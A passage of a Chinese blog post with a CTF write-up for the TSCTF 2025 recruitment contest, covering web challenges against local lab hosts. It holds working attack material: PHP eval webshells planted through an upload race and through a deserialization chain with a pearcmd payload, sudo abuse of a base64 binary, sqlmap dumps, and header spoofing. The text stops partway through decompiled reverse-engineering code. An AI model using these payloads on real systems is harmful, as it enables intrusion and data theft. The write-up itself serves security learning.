<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TSCTFwp | Link's Blog</title><meta name="author" content="Link"><meta name="copyright" content="Link"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="天璇战队2025招新赛">
<meta property="og:type" content="article">
<meta property="og:title" content="TSCTFwp">
<meta property="og:url" content="http://1lnk.top/2025/11/14/TSCTFwp/index.html">
<meta property="og:site_name" content="Link&#39;s Blog">
<meta property="og:description" content="天璇战队2025招新赛">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://1lnk.top/2025/11/14/TSCTFwp/cover.png">
<meta property="article:published_time" content="2025-11-13T17:21:48.000Z">
<meta property="article:modified_time" content="2025-11-13T17:21:48.000Z">
<meta property="article:author" content="Link">
<meta property="article:tag" content="基础">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://1lnk.top/2025/11/14/TSCTFwp/cover.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TSCTFwp",
  "url": "http://1lnk.top/2025/11/14/TSCTFwp/",
  "image": "http://1lnk.top/2025/11/14/TSCTFwp/cover.png",
  "datePublished": "2025-11-13T17:21:48.000Z",
  "dateModified": "2025-11-13T17:21:48.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Link",
      "url": "http://1lnk.top"
    }
  ]
}</script><link rel="shortcut icon" href="/img/round.png"><link rel="canonical" href="http://1lnk.top/2025/11/14/TSCTFwp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TSCTFwp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2025/11/14/TSCTFwp/cover.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Link's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">TSCTFwp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">TSCTFwp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-13T17:21:48.000Z" title="发表于 2025-11-14 01:21:48">2025-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-13T17:21:48.000Z" title="更新于 2025-11-14 01:21:48">2025-11-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B5%9B%E4%BA%8B/">赛事</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web-方向"><a href="#Web-方向" class="headerlink" title="Web 方向"></a>Web 方向</h1><h2 id="争渡"><a href="#争渡" class="headerlink" title="争渡"></a>争渡</h2><p>上传php文件 web返回 已从tmp删除 可知存在时间差</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$f</span>, <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用这个脚本 在服务器删除该文件之前 访问文件 使其在tmp写入一句话木马</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:60865/tmp/getshell.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url, headers=headers, timeout=<span class="number">5</span>)  <span class="comment"># 设置超时时间，避免无限等待</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 捕获连接相关异常，避免程序崩溃</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;连接被关闭，重试中...&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请求超时，重试中...&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;其他错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每次请求后暂停一小段时间，减少服务器压力</span></span><br><span class="line">    time.sleep(<span class="number">0.4</span>)  <span class="comment"># 可根据需要调整间隔（如0.1-1秒）</span></span><br></pre></td></tr></table></figure>
<p>访问成功 后 利用蚁剑连接  可以发现flag需要提权访问 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/) $ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on ret2shell-116-91-1763539185:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line">User www-data may run the following commands on ret2shell-116-91-1763539185:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/base64</span><br><span class="line">(www-data:/) $ </span><br></pre></td></tr></table></figure>
<p>通过sudo -l 可以知道 可以利用base64 但是 会发现base64 查看flag返回空<br>说明base64 经过修改 需要查看 他的源码<br>这里提供两种方法</p>
<ol>
<li>base32读&#x2F;usr&#x2F;bin&#x2F;base64文件，然后复制到自己电脑上并解码,则可得到base64</li>
<li>把&#x2F;usr&#x2F;bin&#x2F;base64文件cp到web目录(&#x2F;var&#x2F;www&#x2F;html)下，访问即可下载base64<br>逆向后 发现就是给命令执行程序</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">base64</span> <span class="string">&quot;Y2F0&quot;</span> <span class="string">&quot;L2ZsYWc=&quot;</span></span><br></pre></td></tr></table></figure>
<p>获得flag</p>
<h2 id="EZ-sql"><a href="#EZ-sql" class="headerlink" title="EZ_sql"></a>EZ_sql</h2><p>抓包发现是post传参 尝试用sqlmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.232.1:53977/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> –batch</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-2.png" alt="alt text">发现存在多种sql漏洞 获取所有数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.232.1:53977/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --batch –dbs</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-3.png" alt="alt text"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.232.1:53977/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --batch -D welcome --tables</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-4.png" alt="alt text"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.232.1:53977/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --batch -D welcome -T flag –dump</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-5.png" alt="alt text"><br>获得flag TSCTF-J{sql_1nj3ct10n_m4573r}</p>
<h2 id="EZ-login"><a href="#EZ-login" class="headerlink" title="EZ_login"></a>EZ_login</h2><p><img src="/2025/11/14/TSCTFwp/image-6.png" alt="alt text"><br>对网址进行抓包 可以发现 验证码是跟cookie session 绑定的 ，因此保留cookie  对密码进行爆破 可以得到 simple 是密码<br><img src="/2025/11/14/TSCTFwp/image-7.png" alt="alt text"><br>网页提示 不是本地管理员 ，修改请求包 添加X-Forwarded-For: 127.0.0.1 欺骗网址我是本地登录<br><img src="/2025/11/14/TSCTFwp/image-8.png" alt="alt text"><br>对token进行base64解码 获得flag：<br>TSCTF-J{w31c0m3_70_7h3_w38_j0urn3y}<br><img src="/2025/11/14/TSCTFwp/image-9.png" alt="alt text"></p>
<h2 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h2><p>访问127.0.0.1:57735&#x2F;druid<br><img src="/2025/11/14/TSCTFwp/image-10.png" alt="alt text"><br>猜测 admin为账号密码<br><img src="/2025/11/14/TSCTFwp/image-11.png" alt="alt text"><img src="/2025/11/14/TSCTFwp/image-12.png" alt="alt text"><br>找到用户名Y0v_S22_Dru1d 获得flag</p>
<h2 id="Findsecret"><a href="#Findsecret" class="headerlink" title="Findsecret"></a>Findsecret</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretVault</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$accessKey</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenData</span> =<span class="string">&#x27;a:2:&#123;i:0;s:19:&quot;/usr/local/lib/php/&quot;;i:1;s:11:&quot;/../pearcmd&quot;;&#125;x&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlagGuardian</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$puzzle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$decoy</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretHunter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$clue</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$target</span> = <span class="string">&quot;treasure&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tool</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrapTrigger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trigger</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$countermeasure</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title class_">SecretHunter</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;target= <span class="keyword">new</span> <span class="title class_">FlagGuardian</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;target-&gt;puzzle=<span class="keyword">new</span> <span class="title class_">SecretVault</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造如上 pop链 触发include 函数 获得序列化值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A12%3A%22SecretHunter%22%3A3%3A%7Bs%3A4%3A%22clue%22%3BN%3Bs%3A6%3A%22target%22%3BO%3A12%3A%22FlagGuardian%22%3A2%3A%7Bs%3A6%3A%22puzzle%22%3BO%3A11%3A%22SecretVault%22%3A2%3A%7Bs%3A9%3A%22accessKey%22%3Bi%3A0%3Bs%3A10%3A%22hiddenData%22%3Bs%3A61%3A%22a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22%2Fusr%2Flocal%2Flib%2Fphp%2F%22%3Bi%3A1%3Bs%3A11%3A%22%2F..%2Fpearcmd%22%3B%7Dx%22%3B%7Ds%3A5%3A%22decoy%22%3BN%3B%7Ds%3A4%3A%22tool%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
<p>传参后 web访问pearcmd..php<br><img src="/2025/11/14/TSCTFwp/image-14.png" alt="alt text"><br>接下来利用 pearcmd 对web传参 实现rce</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_GET[&#x27;cmd&#x27;]);?&gt;+/var/www/html/webshell.php</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-15.png" alt="alt text"><br>注意hackbar 会将&lt;&gt;进行url编码 导致 可执行代码没有被正确识别 所以使用bp传参<img src="/2025/11/14/TSCTFwp/image-16.png" alt="alt text"> 访问flag文件<br><img src="/2025/11/14/TSCTFwp/image-17.png" alt="alt text">获得flag TSCTF-J{N0w-y0u-kNOW_iNTErEStlng-Pop_@ND_IfI_To_rCE649}</p>
<h1 id="Reverse-方向"><a href="#Reverse-方向" class="headerlink" title="Reverse 方向"></a>Reverse 方向</h1><h2 id="Singin"><a href="#Singin" class="headerlink" title="Singin"></a>Singin</h2><p>用ida逆向得 以下关键代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_140001700</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Stream *Stream; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 Buf2; <span class="comment">// [rsp+120h] [rbp+A0h] BYREF</span></span><br><span class="line">  _QWORD v4[<span class="number">4</span>]; <span class="comment">// [rsp+128h] [rbp+A8h]</span></span><br><span class="line">  <span class="type">void</span> *Buf1; <span class="comment">// [rsp+148h] [rbp+C8h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *WelcomeToTSCTF; <span class="comment">// [rsp+150h] [rbp+D0h]</span></span><br><span class="line">  <span class="type">size_t</span> Size; <span class="comment">// [rsp+158h] [rbp+D8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_140001960</span>();</span><br><span class="line">  Buf2 = <span class="number">0x3D13023261347C23LL</span>;</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">0x143402370D641267LL</span>;</span><br><span class="line">  *(_QWORD *)((<span class="type">char</span> *)v4 + <span class="number">7</span>) = <span class="number">0x347024692B7A0314LL</span>;</span><br><span class="line">  *(_QWORD *)((<span class="type">char</span> *)&amp;v4[<span class="number">1</span>] + <span class="number">7</span>) = <span class="number">0x284202766B703261LL</span>;</span><br><span class="line">  Size = <span class="number">31LL</span>;</span><br><span class="line">  <span class="built_in">sub_1400029A0</span>(<span class="string">&quot;please input your flag: &quot;</span>);</span><br><span class="line">  Stream = __acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">fgets</span>(Buffer, <span class="number">256</span>, Stream) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  Buffer[<span class="built_in">strcspn</span>(Buffer, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( Size == <span class="built_in">strlen</span>(Buffer) )</span><br><span class="line">  &#123;</span><br><span class="line">    WelcomeToTSCTF = <span class="string">&quot;WelcomeToTSCTF&quot;</span>;</span><br><span class="line">    Buf1 = <span class="built_in">malloc</span>(Size);</span><br><span class="line">    <span class="keyword">if</span> ( Buf1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_140001660</span>(Buffer, WelcomeToTSCTF, Buf1, Size);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(Buf1, &amp;Buf2, Size) )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct Flag!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong Flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(Buf1);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong Flag!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_140001660</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, __int64 a3, <span class="type">unsigned</span> __int64 i_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  v7 = (<span class="type">char</span> *)<span class="built_in">sub_1400014EC</span>(a2, v4);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(v7);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= i_2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a3 + i) = v7[i % v6] ^ *(_BYTE *)(a1 + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i_1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">_BYTE *__fastcall <span class="title">sub_1400014EC</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 i_1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_140001488</span>(aAbcdefghijklmn);               <span class="comment">// 